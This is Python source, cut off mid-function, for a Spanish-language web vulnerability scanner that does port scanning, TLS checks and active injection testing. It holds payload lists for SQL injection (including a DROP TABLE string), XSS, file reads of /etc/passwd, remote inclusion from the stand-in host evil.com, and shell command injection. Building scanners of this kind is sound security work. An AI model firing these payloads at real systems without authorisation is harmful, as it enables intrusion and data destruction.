"""
NetSereno - Enterprise Vulnerability Scanner
OpenVAS-like Security Assessment Tool
Version 2.0 - January 2026
"""

import requests
import socket
import ssl
import re
import json
import datetime
import hashlib
import concurrent.futures
from urllib.parse import urlparse, urljoin, quote, parse_qs
from bs4 import BeautifulSoup
from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch, cm
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, Image, HRFlowable
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
from reportlab.graphics.shapes import Drawing, Rect
from reportlab.graphics.charts.piecharts import Pie
import warnings
import struct
import time
warnings.filterwarnings('ignore')


# CVE Database (simulated - in production would connect to NVD API)
CVE_DATABASE = {
    'apache_2.2': {'cve': 'CVE-2017-9798', 'cvss': 7.5, 'description': 'Apache httpd 2.2.x Option Bleed vulnerability'},
    'apache_2.4.1': {'cve': 'CVE-2014-0226', 'cvss': 6.8, 'description': 'Race condition in mod_status'},
    'nginx_1.10': {'cve': 'CVE-2017-7529', 'cvss': 7.5, 'description': 'Integer overflow in range filter'},
    'php_5': {'cve': 'CVE-2019-11043', 'cvss': 9.8, 'description': 'PHP-FPM Remote Code Execution'},
    'php_7.0': {'cve': 'CVE-2019-11043', 'cvss': 9.8, 'description': 'PHP-FPM Remote Code Execution'},
    'wordpress_old': {'cve': 'CVE-2021-29447', 'cvss': 6.5, 'description': 'WordPress XXE vulnerability'},
    'jquery_old': {'cve': 'CVE-2020-11023', 'cvss': 6.1, 'description': 'jQuery XSS vulnerability'},
    'openssl_1.0': {'cve': 'CVE-2014-0160', 'cvss': 9.8, 'description': 'Heartbleed vulnerability'},
    'ssl_weak_cipher': {'cve': 'CVE-2013-2566', 'cvss': 5.9, 'description': 'RC4 cipher vulnerability'},
    'tls_1.0': {'cve': 'CVE-2011-3389', 'cvss': 4.3, 'description': 'BEAST attack on TLS 1.0'},
    'ssh_old': {'cve': 'CVE-2020-15778', 'cvss': 7.8, 'description': 'OpenSSH command injection'},
}

# Common ports for scanning
COMMON_PORTS = {
    21: {'name': 'FTP', 'risk': 'medium'},
    22: {'name': 'SSH', 'risk': 'low'},
    23: {'name': 'Telnet', 'risk': 'high'},
    25: {'name': 'SMTP', 'risk': 'medium'},
    53: {'name': 'DNS', 'risk': 'low'},
    80: {'name': 'HTTP', 'risk': 'low'},
    110: {'name': 'POP3', 'risk': 'medium'},
    143: {'name': 'IMAP', 'risk': 'medium'},
    443: {'name': 'HTTPS', 'risk': 'low'},
    445: {'name': 'SMB', 'risk': 'high'},
    993: {'name': 'IMAPS', 'risk': 'low'},
    995: {'name': 'POP3S', 'risk': 'low'},
    1433: {'name': 'MSSQL', 'risk': 'high'},
    1521: {'name': 'Oracle', 'risk': 'high'},
    3306: {'name': 'MySQL', 'risk': 'high'},
    3389: {'name': 'RDP', 'risk': 'high'},
    5432: {'name': 'PostgreSQL', 'risk': 'high'},
    5900: {'name': 'VNC', 'risk': 'high'},
    6379: {'name': 'Redis', 'risk': 'high'},
    8080: {'name': 'HTTP-Alt', 'risk': 'low'},
    8443: {'name': 'HTTPS-Alt', 'risk': 'low'},
    27017: {'name': 'MongoDB', 'risk': 'high'},
}

# Extended port list for deep scans
EXTENDED_PORTS = list(COMMON_PORTS.keys()) + [
    135, 139, 389, 465, 587, 636, 873, 902, 1080, 1194, 1723, 2049,
    2082, 2083, 2181, 2375, 2376, 3000, 3128, 4443, 5000, 5001,
    5672, 5984, 6443, 7001, 7002, 8000, 8008, 8081, 8181, 8888,
    9000, 9090, 9200, 9300, 10000, 11211, 15672, 27018
]


class ScanProfile:
    """Scan profiles similar to OpenVAS"""
    QUICK = 'quick'  # Fast scan - top 20 ports, basic web checks
    STANDARD = 'standard'  # Standard scan - top 100 ports, full web checks
    DEEP = 'deep'  # Deep scan - extended ports, comprehensive tests
    FULL = 'full'  # Full audit - all checks, aggressive testing


class VulnerabilityScanner:
    """
    Enterprise-grade vulnerability scanner
    OpenVAS-like comprehensive security assessment
    """

    def __init__(self, target_url, scan_id=None, profile=ScanProfile.STANDARD):
        self.target_url = target_url if target_url.startswith(('http://', 'https://')) else f'http://{target_url}'
        self.parsed_url = urlparse(self.target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.domain = self.parsed_url.netloc.split(':')[0]
        self.scan_id = scan_id or datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:20]
        self.profile = profile
        self.ip = None
        self.results = {}
        self.vulnerabilities = []
        self.open_ports = []
        self.services = {}
        self.ssl_info = {}
        self.cms_detected = None
        self.technologies = []
        self.scan_start = None
        self.scan_end = None
        self.progress = 0
        self.status = "Inicializando..."
        self.total_tests = 0
        self.completed_tests = 0

        try:
            self.ip = socket.gethostbyname(self.domain)
        except Exception:
            self.ip = "No se pudo resolver"

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }

        # Expanded payloads
        self.sql_payloads = [
            "' OR '1'='1", "' OR 1=1 --", "' OR 1=1 #", "admin' --",
            "' UNION SELECT NULL--", "1' ORDER BY 1--", "' AND 1=2--",
            "1' AND '1'='1", "') OR ('1'='1", "' OR 'x'='x",
            "1; DROP TABLE users--", "' OR ''='", "admin'/*",
            "' HAVING 1=1--", "' GROUP BY columnnames--"
        ]

        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "'-alert(1)-'", "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}", "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"
        ]

        self.lfi_payloads = [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "/etc/passwd%00", "..%2f..%2f..%2fetc/passwd",
            "....\/....\/....\/etc/passwd", "../../../windows/win.ini"
        ]

        self.rfi_payloads = [
            "http://evil.com/shell.txt", "//evil.com/shell.txt",
            "\\\\evil.com\\shell.txt"
        ]

        self.command_payloads = [
            "; ls -la", "| cat /etc/passwd", "& dir",
            "`whoami`", "$(whoami)", "; ping -c 3 127.0.0.1"
        ]

        self.sensitive_files = [
            "/.git/HEAD", "/.git/config", "/.env", "/.env.local", "/.env.production",
            "/config.php", "/wp-config.php", "/wp-config.php.bak", "/configuration.php",
            "/.DS_Store", "/web.config", "/phpinfo.php", "/backup.sql", "/dump.sql",
            "/robots.txt", "/.htaccess", "/.htpasswd", "/composer.json", "/package.json",
            "/server-status", "/server-info", "/.svn/entries", "/crossdomain.xml",
            "/sitemap.xml", "/admin.php", "/admin/", "/phpmyadmin/", "/wp-admin/",
            "/.well-known/security.txt", "/api/", "/graphql", "/swagger.json",
            "/api-docs/", "/v1/", "/v2/", "/debug/", "/trace/", "/actuator/health"
        ]

        self.admin_paths = [
            "/admin", "/administrator", "/admin.php", "/admin/login", "/wp-admin",
            "/wp-login.php", "/user/login", "/login", "/signin", "/dashboard",
            "/cpanel", "/webmail", "/panel", "/control", "/manager", "/backend",
            "/sistema", "/administrador", "/gestion", "/acceso"
        ]

    def run_scan(self):
        """Execute comprehensive security scan based on profile"""
        self.scan_start = datetime.datetime.now()

        if self.profile == ScanProfile.QUICK:
            tests = self._get_quick_tests()
        elif self.profile == ScanProfile.DEEP or self.profile == ScanProfile.FULL:
            tests = self._get_deep_tests()
        else:
            tests = self._get_standard_tests()

        self.total_tests = len(tests)

        for i, (description, test_func) in enumerate(tests):
            progress = int(((i + 1) / len(tests)) * 100)
            self.progress = min(progress, 99)
            self.status = description

            try:
                key = test_func.__name__.replace('check_', '').replace('scan_', '')
                result = test_func()
                self.results[key] = result

                # Collect vulnerabilities
                if result.get('vulnerable'):
                    for finding in result.get('findings', []):
                        if 'info' not in finding:
                            self.vulnerabilities.append({
                                'category': key,
                                'description': description,
                                **finding
                            })
            except Exception as e:
                self.results[key] = {
                    "vulnerable": False,
                    "findings": [],
                    "error": str(e)
                }

            self.completed_tests = i + 1

        self.progress = 100
        self.status = "Escaneo completado"
        self.scan_end = datetime.datetime.now()

        return self.results

    def _get_quick_tests(self):
        """Quick scan tests"""
        return [
            ("Escaneando puertos principales", self.scan_ports_quick),
            ("Analizando SSL/TLS", self.check_ssl_tls),
            ("Detectando tecnologías", self.detect_technologies),
            ("Verificando cabeceras de seguridad", self.check_security_headers),
            ("Probando inyección SQL", self.check_injection),
            ("Probando XSS", self.check_xss),
            ("Buscando archivos sensibles", self.check_sensitive_files),
            ("Verificando configuración", self.check_security_misconfiguration),
        ]

    def _get_standard_tests(self):
        """Standard scan tests"""
        return [
            ("Escaneando puertos comunes", self.scan_ports_standard),
            ("Detectando servicios", self.detect_services),
            ("Analizando certificado SSL/TLS", self.check_ssl_tls),
            ("Analizando cifrado SSL", self.check_ssl_ciphers),
            ("Detectando tecnologías web", self.detect_technologies),
            ("Identificando CMS", self.detect_cms),
            ("Verificando cabeceras de seguridad", self.check_security_headers),
            ("Probando inyección SQL", self.check_injection),
            ("Probando Cross-Site Scripting", self.check_xss),
            ("Probando inclusión de archivos", self.check_file_inclusion),
            ("Verificando autenticación", self.check_broken_authentication),
            ("Probando control de acceso", self.check_broken_access_control),
            ("Buscando archivos expuestos", self.check_sensitive_files),
            ("Verificando configuración de seguridad", self.check_security_misconfiguration),
            ("Analizando componentes", self.check_vulnerable_components),
            ("Verificando métodos HTTP", self.check_http_methods),
            ("Analizando cookies", self.check_cookie_security),
            ("Verificando CORS", self.check_cors),
        ]

    def _get_deep_tests(self):
        """Deep/Full scan tests"""
        return [
            ("Escaneando todos los puertos", self.scan_ports_deep),
            ("Detectando servicios activos", self.detect_services),
            ("Análisis profundo SSL/TLS", self.check_ssl_tls),
            ("Verificando cifrados SSL", self.check_ssl_ciphers),
            ("Detectando tecnologías", self.detect_technologies),
            ("Identificando CMS y versiones", self.detect_cms),
            ("Analizando cabeceras HTTP", self.check_security_headers),
            ("Inyección SQL avanzada", self.check_injection_advanced),
            ("XSS avanzado", self.check_xss_advanced),
            ("Inclusión de archivos locales", self.check_file_inclusion),
            ("Inyección de comandos", self.check_command_injection),
            ("Verificando autenticación", self.check_broken_authentication),
            ("Control de acceso", self.check_broken_access_control),
            ("Archivos y directorios sensibles", self.check_sensitive_files),
            ("Configuración de seguridad", self.check_security_misconfiguration),
            ("Componentes vulnerables", self.check_vulnerable_components),
            ("Métodos HTTP peligrosos", self.check_http_methods),
            ("Seguridad de cookies", self.check_cookie_security),
            ("Configuración CORS", self.check_cors),
            ("Verificando CSRF", self.check_csrf),
            ("Subdominios", self.check_subdomain_takeover),
            ("Información del servidor", self.check_server_info),
        ]

    def scan_ports_quick(self):
        """Quick port scan - top 10 ports"""
        return self._scan_ports([21, 22, 23, 80, 443, 3306, 3389, 5432, 8080, 8443])

    def scan_ports_standard(self):
        """Standard port scan - common ports"""
        return self._scan_ports(list(COMMON_PORTS.keys()))

    def scan_ports_deep(self):
        """Deep port scan - extended ports"""
        return self._scan_ports(EXTENDED_PORTS)

    def _scan_ports(self, ports):
        """Scan specified ports"""
        results = {"vulnerable": False, "findings": [], "severity": "Info", "open_ports": []}

        if self.ip == "No se pudo resolver":
            results["findings"].append({"info": "No se pudo resolver la IP del host"})
            return results

        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.ip, port))
                sock.close()
                return port if result == 0 else None
            except Exception:
                return None

        # Parallel port scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            open_ports = list(filter(None, executor.map(check_port, ports)))

        self.open_ports = open_ports
        results["open_ports"] = open_ports

        for port in open_ports:
            port_info = COMMON_PORTS.get(port, {'name': 'Unknown', 'risk': 'medium'})
            severity = "High" if port_info['risk'] == 'high' else "Medium" if port_info['risk'] == 'medium' else "Info"

            finding = {
                "type": "Puerto abierto",
                "port": port,
                "service": port_info['name'],
                "severity": severity
            }

            if port_info['risk'] == 'high':
                results["vulnerable"] = True
                finding["description"] = f"Puerto {port} ({port_info['name']}) abierto - servicio de alto riesgo"

            results["findings"].append(finding)

        if not open_ports:
            results["findings"].append({"info": "No se detectaron puertos abiertos en el rango escaneado"})

        return results

    def detect_services(self):
        """Detect services running on open ports"""
        results = {"vulnerable": False, "findings": [], "severity": "Info"}

        for port in self.open_ports[:20]:  # Limit to first 20 ports
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.ip, port))

                # Send probe and get banner
                if port in [80, 8080, 8000, 8081]:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                elif port == 21:
                    pass  # FTP sends banner automatically
                elif port == 22:
                    pass  # SSH sends banner automatically
                elif port == 25:
                    sock.send(b"EHLO test\r\n")
                else:
                    sock.send(b"\r\n")

                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()

                if banner:
                    self.services[port] = banner[:200]
                    results["findings"].append({
                        "type": "Servicio detectado",
                        "port": port,
                        "banner": banner[:100],
                        "severity": "Info"
                    })

                    # Check for vulnerable versions
                    self._check_banner_vulnerabilities(banner, results)

            except Exception:
                continue

        if not results["findings"]:
            results["findings"].append({"info": "No se pudieron detectar servicios"})

        return results

    def _check_banner_vulnerabilities(self, banner, results):
        """Check banner for known vulnerabilities"""
        banner_lower = banner.lower()

        vuln_patterns = [
            ('apache/2.2', 'apache_2.2'),
            ('apache/2.4.1', 'apache_2.4.1'),
            ('nginx/1.10', 'nginx_1.10'),
            ('php/5', 'php_5'),
            ('php/7.0', 'php_7.0'),
            ('openssh', 'ssh_old'),
        ]

        for pattern, cve_key in vuln_patterns:
            if pattern in banner_lower:
                cve_info = CVE_DATABASE.get(cve_key, {})
                if cve_info:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "Versión vulnerable detectada",
                        "version": banner[:50],
                        "cve": cve_info.get('cve', 'N/A'),
                        "cvss": cve_info.get('cvss', 0),
                        "description": cve_info.get('description', ''),
                        "severity": "Critical" if cve_info.get('cvss', 0) >= 9.0 else "High" if cve_info.get('cvss', 0) >= 7.0 else "Medium"
                    })

    def check_ssl_tls(self):
        """Comprehensive SSL/TLS analysis"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        if not self.target_url.startswith('https'):
            # Check if HTTPS is available
            try:
                response = requests.head(f"https://{self.domain}", timeout=5, verify=False)
                results["findings"].append({
                    "type": "HTTPS disponible pero no forzado",
                    "description": "El sitio acepta conexiones HTTP inseguras",
                    "severity": "High"
                })
                results["vulnerable"] = True
            except Exception:
                results["findings"].append({
                    "type": "Sin cifrado HTTPS",
                    "description": "El sitio no soporta conexiones HTTPS",
                    "severity": "Critical"
                })
                results["vulnerable"] = True
                return results

        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with socket.create_connection((self.domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    cert_dict = ssl.DER_cert_to_PEM_cert(cert)

                    # Get certificate info
                    x509 = ssock.getpeercert()

                    if x509:
                        # Check expiration
                        not_after = x509.get('notAfter', '')
                        if not_after:
                            try:
                                exp_date = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                                days_left = (exp_date - datetime.datetime.now()).days

                                if days_left < 0:
                                    results["findings"].append({
                                        "type": "Certificado SSL expirado",
                                        "expiration": not_after,
                                        "severity": "Critical"
                                    })
                                    results["vulnerable"] = True
                                elif days_left < 30:
                                    results["findings"].append({
                                        "type": "Certificado SSL próximo a expirar",
                                        "days_left": days_left,
                                        "expiration": not_after,
                                        "severity": "High"
                                    })
                                    results["vulnerable"] = True
                                else:
                                    self.ssl_info['expiration'] = not_after
                                    self.ssl_info['days_left'] = days_left
                            except Exception:
                                pass

                        # Check issuer
                        issuer = x509.get('issuer', ())
                        issuer_str = str(issuer)
                        self.ssl_info['issuer'] = issuer_str

                        if 'self-signed' in issuer_str.lower() or not issuer:
                            results["findings"].append({
                                "type": "Certificado auto-firmado",
                                "description": "El certificado no está firmado por una CA confiable",
                                "severity": "Medium"
                            })
                            results["vulnerable"] = True

                    # Check protocol version
                    protocol = ssock.version()
                    self.ssl_info['protocol'] = protocol

                    if protocol in ['TLSv1', 'TLSv1.0', 'SSLv3', 'SSLv2']:
                        cve_info = CVE_DATABASE.get('tls_1.0', {})
                        results["findings"].append({
                            "type": "Protocolo SSL/TLS obsoleto",
                            "protocol": protocol,
                            "cve": cve_info.get('cve', 'N/A'),
                            "cvss": cve_info.get('cvss', 0),
                            "description": "Protocolo vulnerable a ataques BEAST/POODLE",
                            "severity": "High"
                        })
                        results["vulnerable"] = True
                    else:
                        results["findings"].append({
                            "type": "Protocolo SSL/TLS",
                            "protocol": protocol,
                            "severity": "Info"
                        })

        except ssl.SSLError as e:
            results["findings"].append({
                "type": "Error SSL",
                "description": str(e)[:100],
                "severity": "High"
            })
            results["vulnerable"] = True
        except Exception as e:
            results["findings"].append({"info": f"No se pudo analizar SSL: {str(e)[:50]}"})

        if not results["findings"]:
            results["findings"].append({"info": "Configuración SSL/TLS correcta"})

        return results

    def check_ssl_ciphers(self):
        """Check for weak SSL ciphers"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL', 'EXPORT', 'anon', '3DES']

        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with socket.create_connection((self.domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cipher = ssock.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        self.ssl_info['cipher'] = cipher_name

                        for weak in weak_ciphers:
                            if weak.upper() in cipher_name.upper():
                                cve_info = CVE_DATABASE.get('ssl_weak_cipher', {})
                                results["findings"].append({
                                    "type": "Cifrado SSL débil",
                                    "cipher": cipher_name,
                                    "cve": cve_info.get('cve', 'N/A'),
                                    "cvss": cve_info.get('cvss', 0),
                                    "severity": "High"
                                })
                                results["vulnerable"] = True
                                break
                        else:
                            results["findings"].append({
                                "type": "Cifrado SSL",
                                "cipher": cipher_name,
                                "severity": "Info"
                            })
        except Exception:
            results["findings"].append({"info": "No se pudo verificar cifrados SSL"})

        return results

    def detect_technologies(self):
        """Detect web technologies"""
        results = {"vulnerable": False, "findings": [], "severity": "Info"}

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)

            # Check headers
            tech_headers = {
                'X-Powered-By': 'Tecnología backend',
                'Server': 'Servidor web',
                'X-AspNet-Version': 'ASP.NET',
                'X-AspNetMvc-Version': 'ASP.NET MVC',
                'X-Generator': 'Generador',
            }

            for header, desc in tech_headers.items():
                value = response.headers.get(header)
                if value:
                    self.technologies.append(f"{desc}: {value}")
                    results["findings"].append({
                        "type": "Tecnología detectada",
                        "technology": f"{desc}: {value}",
                        "severity": "Info"
                    })

            # Check HTML for technologies
            html = response.text.lower()

            tech_patterns = [
                ('wp-content', 'WordPress'),
                ('drupal', 'Drupal'),
                ('joomla', 'Joomla'),
                ('magento', 'Magento'),
                ('shopify', 'Shopify'),
                ('bootstrap', 'Bootstrap'),
                ('jquery', 'jQuery'),
                ('react', 'React'),
                ('angular', 'Angular'),
                ('vue', 'Vue.js'),
                ('laravel', 'Laravel'),
                ('django', 'Django'),
                ('express', 'Express.js'),
                ('cloudflare', 'Cloudflare'),
            ]

            for pattern, tech in tech_patterns:
                if pattern in html or pattern in str(response.headers).lower():
                    if tech not in self.technologies:
                        self.technologies.append(tech)
                        results["findings"].append({
                            "type": "Framework/Librería detectada",
                            "technology": tech,
                            "severity": "Info"
                        })

        except Exception as e:
            results["findings"].append({"info": f"Error detectando tecnologías: {str(e)[:50]}"})

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron tecnologías específicas"})

        return results

    def detect_cms(self):
        """Detect CMS and version"""
        results = {"vulnerable": False, "findings": [], "severity": "Info"}

        cms_signatures = {
            'wordpress': ['/wp-content/', '/wp-includes/', 'wp-json', 'wordpress'],
            'drupal': ['/sites/default/', 'drupal.js', '/core/misc/drupal.js', 'drupal'],
            'joomla': ['/components/', '/modules/', 'joomla', '/media/jui/'],
            'magento': ['/skin/frontend/', '/js/mage/', 'magento', 'varien'],
            'prestashop': ['/modules/', 'prestashop', '/themes/default-bootstrap/'],
            'typo3': ['typo3', '/typo3/'],
            'wix': ['wix.com', '_wix'],
            'squarespace': ['squarespace'],
            'shopify': ['cdn.shopify.com', 'shopify'],
        }

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)
            content = response.text.lower()
            headers_str = str(response.headers).lower()

            for cms, signatures in cms_signatures.items():
                for sig in signatures:
                    if sig in content or sig in headers_str:
                        self.cms_detected = cms.capitalize()

                        # Try to detect version
                        version = self._detect_cms_version(cms, response)

                        finding = {
                            "type": "CMS detectado",
                            "cms": cms.capitalize(),
                            "severity": "Info"
                        }

                        if version:
                            finding["version"] = version
                            # Check for known vulnerabilities
                            self._check_cms_vulnerabilities(cms, version, results)

                        results["findings"].append(finding)
                        break
                else:
                    continue
                break

        except Exception as e:
            results["findings"].append({"info": f"Error detectando CMS: {str(e)[:50]}"})

        if not results["findings"]:
            results["findings"].append({"info": "No se detectó CMS conocido"})

        return results

    def _detect_cms_version(self, cms, response):
        """Try to detect CMS version"""
        try:
            if cms == 'wordpress':
                # Check generator meta
                match = re.search(r'content="WordPress\s+([\d.]+)"', response.text, re.I)
                if match:
                    return match.group(1)
                # Check RSS feed
                try:
                    rss = requests.get(f"{self.base_url}/feed/", timeout=5, verify=False)
                    match = re.search(r'generator>https?://wordpress\.org/\?v=([\d.]+)', rss.text)
                    if match:
                        return match.group(1)
                except Exception:
                    pass
            elif cms == 'drupal':
                match = re.search(r'Drupal\s+([\d.]+)', response.text)
                if match:
                    return match.group(1)
            elif cms == 'joomla':
                try:
                    manifest = requests.get(f"{self.base_url}/administrator/manifests/files/joomla.xml", timeout=5, verify=False)
                    match = re.search(r'<version>([\d.]+)</version>', manifest.text)
                    if match:
                        return match.group(1)
                except Exception:
                    pass
        except Exception:
            pass
        return None

    def _check_cms_vulnerabilities(self, cms, version, results):
        """Check for known CMS vulnerabilities"""
        # Simplified vulnerability check
        if cms == 'wordpress':
            try:
                major_version = float(version.split('.')[0] + '.' + version.split('.')[1])
                if major_version < 6.0:
                    cve_info = CVE_DATABASE.get('wordpress_old', {})
                    results["findings"].append({
                        "type": "CMS desactualizado",
                        "cms": "WordPress",
                        "version": version,
                        "cve": cve_info.get('cve', 'N/A'),
                        "cvss": cve_info.get('cvss', 0),
                        "description": "Versión de WordPress con vulnerabilidades conocidas",
                        "severity": "High"
                    })
                    results["vulnerable"] = True
            except Exception:
                pass

    def check_security_headers(self):
        """Check security headers"""
        results = {"vulnerable": False, "findings": [], "severity": "Medium"}

        required_headers = {
            'Strict-Transport-Security': {
                'name': 'HSTS',
                'severity': 'High',
                'description': 'Protección contra ataques de downgrade SSL'
            },
            'X-Frame-Options': {
                'name': 'X-Frame-Options',
                'severity': 'Medium',
                'description': 'Protección contra Clickjacking'
            },
            'X-Content-Type-Options': {
                'name': 'X-Content-Type-Options',
                'severity': 'Medium',
                'description': 'Prevención de MIME-sniffing'
            },
            'Content-Security-Policy': {
                'name': 'CSP',
                'severity': 'High',
                'description': 'Protección contra XSS y ataques de inyección'
            },
            'X-XSS-Protection': {
                'name': 'X-XSS-Protection',
                'severity': 'Low',
                'description': 'Filtro XSS del navegador (obsoleto)'
            },
            'Referrer-Policy': {
                'name': 'Referrer-Policy',
                'severity': 'Low',
                'description': 'Control de información del referrer'
            },
            'Permissions-Policy': {
                'name': 'Permissions-Policy',
                'severity': 'Low',
                'description': 'Control de características del navegador'
            }
        }

        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)
            headers = response.headers

            missing_critical = []
            missing_other = []

            for header, info in required_headers.items():
                if header not in headers:
                    if info['severity'] in ['High', 'Critical']:
                        missing_critical.append(info['name'])
                        results["vulnerable"] = True
                    else:
                        missing_other.append(info['name'])

            if missing_critical:
                results["findings"].append({
                    "type": "Cabeceras críticas faltantes",
                    "headers": ", ".join(missing_critical),
                    "severity": "High",
                    "description": "Faltan cabeceras de seguridad importantes"
                })

            if missing_other:
                results["findings"].append({
                    "type": "Cabeceras recomendadas faltantes",
                    "headers": ", ".join(missing_other),
                    "severity": "Low"
                })

            # Check for information disclosure
            info_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            disclosed = []
            for h in info_headers:
                if h in headers:
                    disclosed.append(f"{h}: {headers[h]}")

            if disclosed:
                results["findings"].append({
                    "type": "Divulgación de información",
                    "headers": ", ".join(disclosed[:3]),
                    "severity": "Low",
                    "description": "El servidor revela información sobre tecnologías utilizadas"
                })

        except Exception as e:
            results["findings"].append({"info": f"Error verificando cabeceras: {str(e)[:50]}"})

        if not results["findings"]:
            results["findings"].append({"info": "Todas las cabeceras de seguridad están configuradas"})

        return results

    def check_injection(self):
        """SQL Injection testing"""
        results = {"vulnerable": False, "findings": [], "severity": "Critical"}

        try:
            # Find forms and parameters
            params = self._find_all_parameters()

            sql_errors = [
                "sql syntax", "mysql", "sqlite", "postgresql", "oracle", "mssql",
                "syntax error", "unclosed quotation", "quoted string not properly",
                "sqlstate", "odbc", "jdbc", "ora-", "pg_", "warning: mysql",
                "you have an error in your sql"
            ]

            tested = 0
            for param_info in params[:10]:  # Limit tests
                for payload in self.sql_payloads[:5]:
                    if tested >= 20:
                        break
                    tested += 1

                    try:
                        if param_info['type'] == 'url':
                            test_url = self._inject_url_parameter(param_info['name'], payload)
                            response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                        else:
                            response = requests.post(
                                param_info['url'],
                                data={param_info['name']: payload},
                                headers=self.headers,
                                timeout=5,
                                verify=False
                            )

                        response_lower = response.text.lower()
                        for error in sql_errors:
                            if error in response_lower:
                                results["findings"].append({
                                    "type": "Inyección SQL",
                                    "parameter": param_info['name'],
                                    "payload": payload[:30],
                                    "cve": "CWE-89",
                                    "cvss": 9.8,
                                    "severity": "Critical",
                                    "description": "Vulnerabilidad de inyección SQL detectada"
                                })
                                results["vulnerable"] = True
                                break
                    except Exception:
                        continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron vulnerabilidades de inyección SQL"})

        return results

    def check_injection_advanced(self):
        """Advanced SQL Injection with time-based detection"""
        results = self.check_injection()

        # Time-based blind SQL injection
        time_payloads = [
            "' OR SLEEP(2)--",
            "'; WAITFOR DELAY '0:0:2'--",
            "' OR pg_sleep(2)--"
        ]

        try:
            params = self._find_all_parameters()

            for param_info in params[:5]:
                for payload in time_payloads:
                    try:
                        start = time.time()
                        if param_info['type'] == 'url':
                            test_url = self._inject_url_parameter(param_info['name'], payload)
                            requests.get(test_url, headers=self.headers, timeout=10, verify=False)
                        elapsed = time.time() - start

                        if elapsed >= 2:
                            results["findings"].append({
                                "type": "Inyección SQL ciega (time-based)",
                                "parameter": param_info['name'],
                                "delay": f"{elapsed:.1f}s",
                                "cve": "CWE-89",
                                "cvss": 9.8,
                                "severity": "Critical"
                            })
                            results["vulnerable"] = True
                            break
                    except Exception:
                        continue
        except Exception:
            pass

        return results

    def check_xss(self):
        """Cross-Site Scripting testing"""
        results = {"vulnerable": False, "findings": [], "severity": "High"}

        try:
            params = self._find_all_parameters()

            for param_info in params[:8]:
                for payload in self.xss_payloads[:4]:
                    try:
                        if param_info['type'] == 'url':
                            test_url = self._inject_url_parameter(param_info['name'], payload)
                            response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                        else:
                            response = requests.post(
                                param_info['url'],
                                data={param_info['name']: payload},
                                headers=self.headers,
                                timeout=5,
                                verify=False
                            )

                        if payload in response.text or payload.replace("'", "&#39;") in response.text:
                            results["findings"].append({
                                "type": "XSS Reflejado",
                                "parameter": param_info['name'],
                                "cve": "CWE-79",
                                "cvss": 6.1,
                                "severity": "High",
                                "description": "El payload XSS se refleja en la respuesta sin sanitizar"
                            })
                            results["vulnerable"] = True
                            break
                    except Exception:
                        continue

        except Exception as e:
            results["error"] = str(e)

        if not results["findings"]:
            results["findings"].append({"info": "No se detectaron vulnerabilidades XSS"})

        return results

    def check_xss_advanced(self):
        """Advanced XSS testing with DOM-based detection"""
        results = self.check_xss()

        # Check for DOM-based XSS indicators
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10, verify=False)

            dom_sinks = [
                'document.write', 'innerHTML', 'outerHTML', 'eval(',
                '.html(', 'location.href', 'location.hash', 'document.URL'
            ]

            for sink in dom_sinks:
                if sink in response.text:
                    results["findings"].append({
                        "type": "Posible DOM XSS",
                        "sink": sink,
                        "severity": "Medium",
                        "description": f"Se detectó uso de '{sink}' que puede ser vulnerable a DOM XSS"
                    })
                    break

        except Exception:
            pass

        return results

    def check_file_inclusion(self):
        """Local/Remote File Inclusion testing"""
        results = {"vulnerable": False, "findings": [], "severity": "Critical"}

        try:
            params = self._find_all_parameters()

            # Filter for likely file parameters
            file_params = [p for p in params if any(x in p['name'].lower() for x in
